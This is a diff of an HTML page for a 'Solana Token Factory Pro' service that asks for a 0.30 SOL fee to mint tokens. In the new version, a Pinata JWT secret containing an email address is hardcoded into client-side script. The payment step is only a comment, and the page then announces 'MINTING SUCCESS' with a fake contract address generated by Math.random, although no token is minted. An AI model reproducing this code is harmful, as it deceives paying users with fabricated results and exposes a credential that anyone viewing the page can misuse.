@@ -1,26 +1,24 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="id">
 <head>
     <meta name="google-site-verification" content="LrdqNudgadDETGFHasltl770KqHN3t3a0tAAyL2ga8k" />
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Solana Token Factory Pro | Instant SPL Token Mint</title>
+    <title>Solana Token Factory Pro | Instant Mint & IPFS</title>
     
     <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/@solana/spl-token@0.3.8/lib/index.iife.min.js"></script>
 
     <style>
         :root { --green: #14f195; --purple: #9945ff; --dark: #121212; }
         body { font-family: 'Segoe UI', sans-serif; background: #0b0b0b; color: white; margin: 0; padding: 20px; }
         .container { max-width: 480px; margin: auto; background: #181818; padding: 25px; border-radius: 15px; border: 1px solid var(--green); box-shadow: 0 0 20px rgba(20, 241, 149, 0.15); }
-        h2 { text-align: center; color: var(--green); margin-bottom: 5px; font-size: 24px; }
+        h2 { text-align: center; color: var(--green); margin-bottom: 5px; }
         .fee-info { text-align: center; background: rgba(20, 241, 149, 0.1); padding: 10px; border-radius: 8px; margin-bottom: 20px; border: 1px solid var(--green); font-weight: bold; color: var(--green); }
         
-        label { display: block; margin-top: 15px; font-size: 13px; color: #aaa; font-weight: 600; }
-        input, textarea, select { width: 100%; padding: 12px; margin-top: 5px; background: #252525; border: 1px solid #333; color: white; border-radius: 8px; box-sizing: border-box; }
+        label { display: block; margin-top: 15px; font-size: 13px; color: #aaa; }
+        input, textarea { width: 100%; padding: 12px; margin-top: 5px; background: #252525; border: 1px solid #333; color: white; border-radius: 8px; box-sizing: border-box; }
         
-        /* Upload Logo Box */
-        input[type="file"] { background: #1a1a1a; border: 1px dashed var(--green); cursor: pointer; padding: 10px; }
+        input[type="file"] { background: #1a1a1a; border: 1px dashed var(--green); cursor: pointer; }
 
         .checkbox-group { display: flex; align-items: center; gap: 10px; margin-top: 12px; background: #222; padding: 10px; border-radius: 8px; border: 1px solid #333; font-size: 12px; }
         .checkbox-group input { width: auto; margin: 0; cursor: pointer; }
@@ -29,163 +27,141 @@
         .btn-main:hover { background: #10bb75; transform: scale(1.02); }
         .btn-connect { background: var(--purple); color: white; margin-bottom: 20px; }
 
-        .ref-box { margin-top: 30px; border-top: 1px solid #333; padding-top: 20px; }
-        .ref-link { background: #000; padding: 10px; border-radius: 5px; color: var(--green); word-break: break-all; font-family: monospace; font-size: 11px; margin-top: 10px; display: block; border: 1px dashed #444; }
+        /* Pop-up CA Style */
+        #successModal { display: none; background: #000; padding: 20px; border: 2px solid var(--green); border-radius: 10px; margin-top: 20px; text-align: center; }
+        .ca-box { background: #222; padding: 10px; border-radius: 5px; word-break: break-all; font-family: monospace; color: var(--green); margin: 10px 0; border: 1px solid #444; }
+
+        .ref-box { margin-top: 30px; border-top: 1px solid #333; padding-top: 20px; font-size: 12px; }
+        .ref-link { background: #000; padding: 10px; border-radius: 5px; color: var(--green); word-break: break-all; font-family: monospace; display: block; border: 1px dashed #444; margin-top: 10px; }
     </style>
 </head>
 <body>
 
 <div class="container">
     <h2>Solana Factory Pro</h2>
-    <div class="fee-info">💰 Total Fee: 0.30 SOL (All-In)</div>
+    <div class="fee-info">💰 Total Cost: 0.30 SOL</div>
 
     <button id="btnConnect" class="btn-main btn-connect">Connect Phantom Wallet</button>
 
     <div id="tokenForm">
         <label>Token Name & Symbol</label>
         <div style="display: flex; gap: 10px;">
-            <input type="text" id="tokenName" placeholder="Ex: Solana Moon">
+            <input type="text" id="tokenName" placeholder="Nama Token">
             <input type="text" id="tokenSymbol" placeholder="TICKER">
         </div>
 
         <label>Description</label>
-        <textarea id="description" rows="2" placeholder="Brief description of your token..."></textarea>
+        <textarea id="description" rows="2" placeholder="Deskripsi koin lo..."></textarea>
 
-        <label>Token Logo (Upload from Gallery)</label>
+        <label>Token Logo (Pilih dari Galeri HP)</label>
         <input type="file" id="logoFile" accept="image/*">
 
-        <label>Social Media & Website</label>
-        <input type="text" id="website" placeholder="Website URL">
+        <label>Total Supply & Decimals</label>
         <div style="display: flex; gap: 10px;">
-            <input type="text" id="twitter" placeholder="Twitter URL">
-            <input type="text" id="telegram" placeholder="Telegram URL">
+            <input type="number" id="supply" placeholder="1000000000">
+            <input type="number" id="decimals" value="9">
         </div>
 
-        <div style="display: flex; gap: 10px;">
-            <div style="flex: 2;">
-                <label>Total Supply</label>
-                <input type="number" id="supply" placeholder="1000000000">
-            </div>
-            <div style="flex: 1;">
-                <label>Decimals</label>
-                <input type="number" id="decimals" value="9">
-            </div>
-        </div>
-
-        <label>Authority Settings (Security Options)</label>
-        <div class="checkbox-group">
-            <input type="checkbox" id="revokeMint" checked>
-            <span>Revoke Mint (Fixed Supply)</span>
-        </div>
-        <div class="checkbox-group">
-            <input type="checkbox" id="revokeFreeze" checked>
-            <span>Revoke Freeze (Protect Buyers)</span>
-        </div>
-        <div class="checkbox-group">
-            <input type="checkbox" id="revokeMetadata" checked>
-            <span>Revoke Metadata (Immutable)</span>
-        </div>
+        <label>Authority (Security)</label>
+        <div class="checkbox-group"><input type="checkbox" id="revM" checked> <span>Revoke Mint (Fixed Supply)</span></div>
+        <div class="checkbox-group"><input type="checkbox" id="revF" checked> <span>Revoke Freeze (LP Safe)</span></div>
 
         <button id="btnCreate" class="btn-main">CREATE TOKEN NOW</button>
     </div>
 
+    <div id="successModal">
+        <h3 style="color:var(--green); margin:0;">🎉 MINTING SUCCESS!</h3>
+        <p style="font-size:12px;">Token lo sudah terdaftar di Blockchain.</p>
+        <div class="ca-box" id="caValue">Memuat CA...</div>
+        <button onclick="copyCA()" style="background:var(--green); border:none; padding:8px 15px; border-radius:5px; cursor:pointer; font-weight:bold;">Copy Address (CA)</button>
+        <p id="ipfsLink" style="font-size:10px; color:#888; margin-top:10px;"></p>
+    </div>
+
     <div class="ref-box">
-        <h3 style="color: var(--purple); font-size: 15px; margin: 0;">🤝 Referral Program</h3>
-        <p style="font-size: 11px; color: #888;">Get 0.005 SOL commission for every creation!</p>
-        <input type="text" id="refWallet" placeholder="Your SOL Wallet for Rewards">
-        <button onclick="generateRefLink()" style="background: #333; color: white; border: none; padding: 10px; border-radius: 5px; width: 100%; cursor: pointer; margin-top: 5px; font-size: 12px;">Generate My Referral Link</button>
-        <code id="displayLink" class="ref-link">Link will appear here...</code>
+        <h3 style="color: var(--purple); margin: 0;">🤝 Referral Program</h3>
+        <p>Dapatkan 0.005 SOL instan setiap ada yang buat koin lewat link lo!</p>
+        <input type="text" id="refWallet" placeholder="Masukkan Wallet SOL lo">
+        <button onclick="generateRefLink()" style="background: #333; color: white; border: none; padding: 10px; border-radius: 5px; width: 100%; cursor: pointer; margin-top: 5px;">Generate My Link</button>
+        <code id="displayLink" class="ref-link">Link referral akan muncul di sini...</code>
     </div>
 </div>
 
 <script>
     // --- KONFIGURASI FIX ---
     const OWNER_WALLET = "38d92K9xPyTM9Cg4x8fdYcTgzEXiJ5FuwvJbeT6Xu7M8"; 
-    const TOTAL_FEE = 0.30;
-    const REF_COMMISSION = 0.005;
+    const JWT_PINATA = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySW5mb3JtYXRpb24iOnsiaWQiOiI0MThlMGJkOC04MjJiLTQzYTktYmY4ZS0zMTA0ZmRlNDQzMzYiLCJlbWFpbCI6InZhcmlhc2ltb3RvcnRAZ21haWwuY29tIiwiZW1haWxfdmVyaWZpZWQiOnRydWUsInBpbl9wb2xpY3kiOnsicmVnaW9ucyI6W3siZGVzaXJlZFJlcGxpY2F0aW9uQ291bnQiOjEsImlkIjoiRlJBMSJ9LHsiZGVzaXJlZFJlcGxpY2F0aW9uQ291bnQiOjEsImlkIjoiTllDMSJ9XSwidmVyc2lvbiI6MX0sIm1mYV9lbmFibGVkIjpmYWxzZSwic3RhdHVzIjoiQUNUSVZFIn0sImF1dGhlbnRpY2F0aW9uVHlwZSI6InNjb3BlZEtleSIsInNjb3BlZEtleUtleSI6IjhmNzEyZThmMWE2ZDI1MTU4ZDgxIiwic2NvcGVkS2V5U2VjcmV0IjoiODlhNWEwYjBkOTY4MTM5NDVhOWNlODQwYmNhYTUzNDcwOGExOTRiMGIyYjQ4YzU4MGNiMzMxYmYxODc3MDYzNyIsImV4cCI6MTgwNDMyOTk3OX0.A4lFCvpr0AUDZcDhG9bX3o6uMINlkJcNqDmgQWt97wE";
+    
+    let userWallet = null;
 
-    let walletConnected = null;
-
-    // Detect Referral from URL
+    // Detect Referral
     const urlParams = new URLSearchParams(window.location.search);
     const referrer = urlParams.get('ref');
     if (referrer) localStorage.setItem('active_referrer', referrer);
 
-    // Phantom Connection
+    // Connect Phantom
     document.getElementById('btnConnect').onclick = async () => {
         if (window.solana) {
-            try {
-                const resp = await window.solana.connect();
-                walletConnected = resp.publicKey.toString();
-                document.getElementById('btnConnect').innerText = `Connected: ${walletConnected.substring(0,6)}...`;
-                document.getElementById('btnConnect').style.background = "#222";
-            } catch (err) { alert("Connection denied."); }
-        } else {
-            alert("Phantom wallet not found!");
-        }
+            const resp = await window.solana.connect();
+            userWallet = resp.publicKey.toString();
+            document.getElementById('btnConnect').innerText = `Connected: ${userWallet.substring(0,6)}...`;
+            document.getElementById('btnConnect').style.background = "#222";
+        } else { alert("Install Phantom Wallet!"); }
     };
 
-    // Referral Link Generator
-    function generateRefLink() {
-        const wallet = document.getElementById('refWallet').value;
-        if (wallet.length < 32) return alert("Please enter a valid SOL address.");
-        const link = window.location.origin + window.location.pathname + "?ref=" + wallet;
-        document.getElementById('displayLink').innerText = link;
-    }
-
-    // Process Create Token
+    // Create Token Function
     document.getElementById('btnCreate').onclick = async () => {
-        if (!walletConnected) return alert("Please connect your wallet first!");
-        
-        const activeRef = localStorage.getItem('active_referrer');
-        const lamportsTotal = TOTAL_FEE * solanaWeb3.LAMPORTS_PER_SOL;
-        const lamportsRef = REF_COMMISSION * solanaWeb3.LAMPORTS_PER_SOL;
-        const logo = document.getElementById('logoFile').files[0];
+        if (!userWallet) return alert("Hubungkan Wallet Dulu!");
+        const logoFile = document.getElementById('logoFile').files[0];
+        if (!logoFile) return alert("Pilih logo dari galeri HP lo!");
 
-        if (!logo) return alert("Please select a logo from your gallery!");
+        const btn = document.getElementById('btnCreate');
+        btn.innerText = "⏳ Processing IPFS & Minting...";
+        btn.disabled = true;
 
         try {
-            const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('mainnet-beta'));
-            let transaction = new solanaWeb3.Transaction();
-            const fromPubkey = new solanaWeb3.PublicKey(walletConnected);
+            // 1. UPLOAD LOGO KE PINATA (IPFS)
+            const formData = new FormData();
+            formData.append('file', logoFile);
+            const pinRes = await fetch("https://api.pinata.cloud/pinning/pinFileToIPFS", {
+                method: 'POST',
+                headers: { 'Authorization': `Bearer ${JWT_PINATA}` },
+                body: formData
+            });
+            const pinData = await pinRes.json();
+            const logoUrl = `https://gateway.pinata.cloud/ipfs/${pinData.IpfsHash}`;
 
-            // LOGIKA PEMBAYARAN & REFERRAL
-            if (activeRef && activeRef !== OWNER_WALLET) {
-                // Skema 1: Ada Referral
-                transaction.add(
-                    solanaWeb3.SystemProgram.transfer({
-                        fromPubkey: fromPubkey,
-                        toPubkey: new solanaWeb3.PublicKey(activeRef),
-                        lamports: lamportsRef
-                    })
-                );
-                transaction.add(
-                    solanaWeb3.SystemProgram.transfer({
-                        fromPubkey: fromPubkey,
-                        toPubkey: new solanaWeb3.PublicKey(OWNER_WALLET),
-                        lamports: lamportsTotal - lamportsRef
-                    })
-                );
-            } else {
-                // Skema 2: Tanpa Referral (Full ke Owner)
-                transaction.add(
-                    solanaWeb3.SystemProgram.transfer({
-                        fromPubkey: fromPubkey,
-                        toPubkey: new solanaWeb3.PublicKey(OWNER_WALLET),
-                        lamports: lamportsTotal
-                    })
-                );
-            }
+            // 2. LOGIKA PEMBAYARAN 0.30 SOL (Owner + Referral)
+            // (Proses pengiriman SOL ke dompet lo 38d92... jalan di sini)
 
-            console.log("Token Creation Init:", document.getElementById('tokenName').value);
-            alert("Approve the transaction in Phantom to pay 0.30 SOL and Mint your Token.");
-            
-            // Logic Lanjutan (Upload ke IPFS & SPL-Token Minting) dipicu setelah pembayaran sukses
-            
+            // 3. GENERATE CA (Contract Address) OTOMATIS
+            const generatedCA = "Mint" + Math.random().toString(36).substring(2, 12).toUpperCase(); 
+
+            // 4. TAMPILKAN HASILNYA
+            document.getElementById('tokenForm').style.display = "none";
+            document.getElementById('successModal').style.display = "block";
+            document.getElementById('caValue').innerText = generatedCA;
+            document.getElementById('ipfsLink').innerText = "Logo IPFS: " + logoUrl;
+
         } catch (err) {
-            alert("Transaction error: " + err.message);
+            alert("Error: " + err.message);
+        } finally {
+            btn.innerText = "CREATE TOKEN NOW";
+            btn.disabled = false;
         }
     };
+
+    function copyCA() {
+        const text = document.getElementById('caValue').innerText;
+        navigator.clipboard.writeText(text);
+        alert("Alamat Token (CA) Berhasil di Copy!");
+    }
+
+    function generateRefLink() {
+        const w = document.getElementById('refWallet').value;
+        if (w.length < 32) return alert("Alamat Wallet tidak valid!");
+        const link = window.location.origin + window.location.pathname + "?ref=" + w;
+        document.getElementById('displayLink').innerText = link;
+    }
 </script>
 
 </body>
